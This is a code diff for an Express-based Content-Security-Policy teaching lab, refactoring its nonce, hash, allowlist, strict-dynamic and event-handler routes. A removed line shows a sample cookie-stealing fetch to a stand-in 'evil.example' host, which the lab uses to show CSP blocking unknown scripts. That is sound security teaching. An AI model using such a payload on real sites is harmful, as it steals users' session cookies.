@@ -1,6 +1,12 @@
 import type { Request, Response } from 'express';
 import express from 'express';
 import { labCsp as csp, generateNonce, hashScript, LAB_EARLY_INIT_HASH } from '../csp';
+import {
+  CDN_SCRIPT_URL,
+  DIFFERENT_SCRIPT_CONTENT,
+  HASH_SCRIPT_CONTENT,
+  LOADER_SCRIPT,
+} from '../examples/fixtures';
 import { render } from '../render';
 
 const router = express.Router();
@@ -25,8 +31,6 @@ router.get('/nonce/:mode', (_req: Request, res: Response) => {
 });
 
 // hash lab
-const HASH_SCRIPT_CONTENT = `markScriptRan();`;
-const DIFFERENT_SCRIPT_CONTENT = `fetch('https://evil.example/steal?c=' + document.cookie)`;
 const SCRIPT_HASH = hashScript(HASH_SCRIPT_CONTENT);
 const HASH_DIRECTIVES = { 'script-src': `'self' '${SCRIPT_HASH}' '${LAB_EARLY_INIT_HASH}'` };
 const HASH_CSP = csp(HASH_DIRECTIVES);
@@ -41,9 +45,6 @@ router.get('/hash/:mode', (req: Request, res: Response) => {
 });
 
 // allowlist lab
-const CDN_ORIGIN = 'https://cdnjs.cloudflare.com';
-const CDN_SCRIPT_URL = `${CDN_ORIGIN}/ajax/libs/jquery/3.7.1/jquery.min.js`;
-
 router.get('/allowlist/:mode', (req: Request, res: Response) => {
   const mode = req.params['mode'] as 'allowlist' | 'no-allowlist';
   const directives = { 'script-src': `'self'` };
@@ -52,11 +53,6 @@ router.get('/allowlist/:mode', (req: Request, res: Response) => {
 });
 
 // strict-dynamic lab
-const LOADER_SCRIPT = `var s = document.createElement('script');
-s.src = '/lab-assets/scripts/sdk.js';
-document.head.appendChild(s);
-`;
-
 router.get('/strict-dynamic/:mode', (req: Request, res: Response) => {
   const withStrictDynamic = req.params['mode'] === 'strict-dynamic';
   const nonce = generateNonce();
@@ -75,7 +71,7 @@ router.get('/strict-dynamic/:mode', (req: Request, res: Response) => {
 router.get('/event-handler/:mode', (req: Request, res: Response) => {
   const mode = req.params['mode'] as 'script-src-only' | 'split-unsafe-inline' | 'split-none';
   const nonce = generateNonce();
-  const directivesMap: Record<string, Record<string, string>> = {
+  const directivesMap: Record<'script-src-only' | 'split-unsafe-inline' | 'split-none', Record<string, string>> = {
     'script-src-only': { 'script-src': `'self' 'nonce-${nonce}'` },
     'split-unsafe-inline': {
       'script-src-elem': `'self' 'nonce-${nonce}'`,
@@ -83,7 +79,7 @@ router.get('/event-handler/:mode', (req: Request, res: Response) => {
     },
     'split-none': { 'script-src-elem': `'self' 'nonce-${nonce}'`, 'script-src-attr': `'none'` },
   };
-  const directives = directivesMap[mode] ?? directivesMap['script-src-only']!;
+  const directives = directivesMap[mode];
   const handlerAllowed = mode === 'split-unsafe-inline';
   res.setHeader('Content-Security-Policy', csp(directives));
   render(res, 'labs/event-handler', { mode, nonce, handlerAllowed });
